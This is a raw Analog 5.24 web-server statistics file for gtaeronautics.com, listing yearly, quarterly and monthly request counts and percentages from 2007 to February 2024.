x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2024	02	16	02	08
x	FR	2007	12	18	17	05
x	LR	2024	02	15	05	58
x	E7	2024	02	16	02	08
x	SR	1706440
x	S7	8778
x	NC	599604
x	C7	0
x	FL	635307
x	F7	415
x	RR	254
x	R7	0
x	NH	109723
x	H7	381
x	BT	57520368399
x	B7	0
1	Rr	102234	5.991	2024
1	Rr	511208	29.958	2023
1	Rr	82334	4.825	2022
1	Rr	98917	5.797	2021
1	Rr	89380	5.238	2020
1	Rr	80088	4.693	2019
1	Rr	68927	4.039	2018
1	Rr	60168	3.526	2017
1	Rr	73316	4.296	2016
1	Rr	80796	4.735	2015
1	Rr	110773	6.491	2014
1	Rr	65173	3.819	2013
1	Rr	60742	3.560	2012
1	Rr	57015	3.341	2011
1	Rr	22139	1.297	2010
1	Rr	69710	4.085	2009
1	Rr	71820	4.209	2008
1	Rr	1700	0.100	2007
1	*BT	R	511208	2023
Q	Rr	102234	5.991	2024	1
Q	Rr	182268	10.681	2023	4
Q	Rr	165939	9.724	2023	3
Q	Rr	135306	7.929	2023	2
Q	Rr	27695	1.623	2023	1
Q	Rr	20307	1.190	2022	4
Q	Rr	20362	1.193	2022	3
Q	Rr	21795	1.277	2022	2
Q	Rr	19870	1.164	2022	1
Q	Rr	21154	1.240	2021	4
Q	Rr	26826	1.572	2021	3
Q	Rr	30675	1.798	2021	2
Q	Rr	20262	1.187	2021	1
Q	Rr	22199	1.301	2020	4
Q	Rr	23882	1.400	2020	3
Q	Rr	21656	1.269	2020	2
Q	Rr	21643	1.268	2020	1
Q	Rr	19098	1.119	2019	4
Q	Rr	19668	1.153	2019	3
Q	Rr	19827	1.162	2019	2
Q	Rr	21495	1.260	2019	1
Q	Rr	18129	1.062	2018	4
Q	Rr	17138	1.004	2018	3
Q	Rr	16928	0.992	2018	2
Q	Rr	16732	0.981	2018	1
Q	Rr	15937	0.934	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	0.986	2017	2
Q	Rr	27400	1.606	2017	1
Q	Rr	22114	1.296	2016	4
Q	Rr	17621	1.033	2016	3
Q	Rr	15878	0.930	2016	2
Q	Rr	17703	1.037	2016	1
Q	Rr	16575	0.971	2015	4
Q	Rr	22104	1.295	2015	3
Q	Rr	22485	1.318	2015	2
Q	Rr	19632	1.150	2015	1
Q	Rr	21142	1.239	2014	4
Q	Rr	22272	1.305	2014	3
Q	Rr	31453	1.843	2014	2
Q	Rr	35906	2.104	2014	1
Q	Rr	16436	0.963	2013	4
Q	Rr	15216	0.892	2013	3
Q	Rr	16545	0.970	2013	2
Q	Rr	16976	0.995	2013	1
Q	Rr	16578	0.971	2012	4
Q	Rr	12511	0.733	2012	3
Q	Rr	15816	0.927	2012	2
Q	Rr	15837	0.928	2012	1
Q	Rr	15444	0.905	2011	4
Q	Rr	17386	1.019	2011	3
Q	Rr	9395	0.551	2011	2
Q	Rr	14790	0.867	2011	1
Q	Rr	1603	0.094	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	0.823	2010	2
Q	Rr	6489	0.380	2010	1
Q	Rr	16350	0.958	2009	4
Q	Rr	18220	1.068	2009	3
Q	Rr	17115	1.003	2009	2
Q	Rr	18025	1.056	2009	1
Q	Rr	15905	0.932	2008	4
Q	Rr	15660	0.918	2008	3
Q	Rr	22448	1.315	2008	2
Q	Rr	17807	1.044	2008	1
Q	Rr	1700	0.100	2007	4
Q	*BT	R	182268	2023	4
m	Rr	28176	1.651	2024	02
m	Rr	74058	4.340	2024	01
m	Rr	54270	3.180	2023	12
m	Rr	61278	3.591	2023	11
m	Rr	66720	3.910	2023	10
m	Rr	51132	2.996	2023	09
m	Rr	54561	3.197	2023	08
m	Rr	60246	3.531	2023	07
m	Rr	66204	3.880	2023	06
m	Rr	60120	3.523	2023	05
m	Rr	8982	0.526	2023	04
m	Rr	10848	0.636	2023	03
m	Rr	8360	0.490	2023	02
m	Rr	8487	0.497	2023	01
m	Rr	6950	0.407	2022	12
m	Rr	6349	0.372	2022	11
m	Rr	7008	0.411	2022	10
m	Rr	6740	0.395	2022	09
m	Rr	6863	0.402	2022	08
m	Rr	6759	0.396	2022	07
m	Rr	6567	0.385	2022	06
m	Rr	8427	0.494	2022	05
m	Rr	6801	0.399	2022	04
m	Rr	6380	0.374	2022	03
m	Rr	6175	0.362	2022	02
m	Rr	7315	0.429	2022	01
m	Rr	7667	0.449	2021	12
m	Rr	7097	0.416	2021	11
m	Rr	6390	0.374	2021	10
m	Rr	6059	0.355	2021	09
m	Rr	9092	0.533	2021	08
m	Rr	11675	0.684	2021	07
m	Rr	10152	0.595	2021	06
m	Rr	10231	0.600	2021	05
m	Rr	10292	0.603	2021	04
m	Rr	7948	0.466	2021	03
m	Rr	5800	0.340	2021	02
m	Rr	6514	0.382	2021	01
m	Rr	8069	0.473	2020	12
m	Rr	6579	0.386	2020	11
m	Rr	7551	0.443	2020	10
m	Rr	8028	0.470	2020	09
m	Rr	7741	0.454	2020	08
m	Rr	8113	0.475	2020	07
m	Rr	7317	0.429	2020	06
m	Rr	6898	0.404	2020	05
m	Rr	7441	0.436	2020	04
m	Rr	7524	0.441	2020	03
m	Rr	7322	0.429	2020	02
m	Rr	6797	0.398	2020	01
m	Rr	6573	0.385	2019	12
m	Rr	5917	0.347	2019	11
m	Rr	6608	0.387	2019	10
m	Rr	6791	0.398	2019	09
m	Rr	6597	0.387	2019	08
m	Rr	6280	0.368	2019	07
m	Rr	6317	0.370	2019	06
m	Rr	6847	0.401	2019	05
m	Rr	6663	0.390	2019	04
m	Rr	7059	0.414	2019	03
m	Rr	6374	0.374	2019	02
m	Rr	8062	0.472	2019	01
m	Rr	6957	0.408	2018	12
m	Rr	5422	0.318	2018	11
m	Rr	5750	0.337	2018	10
m	Rr	5458	0.320	2018	09
m	Rr	5735	0.336	2018	08
m	Rr	5945	0.348	2018	07
m	Rr	7110	0.417	2018	06
m	Rr	6440	0.377	2018	05
m	Rr	3378	0.198	2018	04
m	Rr	5789	0.339	2018	03
m	Rr	5369	0.315	2018	02
m	Rr	5574	0.327	2018	01
m	Rr	3906	0.229	2017	12
m	Rr	6533	0.383	2017	11
m	Rr	5498	0.322	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.400	2017	05
m	Rr	9999	0.586	2017	04
m	Rr	11887	0.697	2017	03
m	Rr	7941	0.465	2017	02
m	Rr	7572	0.444	2017	01
m	Rr	9483	0.556	2016	12
m	Rr	7121	0.417	2016	11
m	Rr	5510	0.323	2016	10
m	Rr	6288	0.368	2016	09
m	Rr	5888	0.345	2016	08
m	Rr	5445	0.319	2016	07
m	Rr	5042	0.295	2016	06
m	Rr	5495	0.322	2016	05
m	Rr	5341	0.313	2016	04
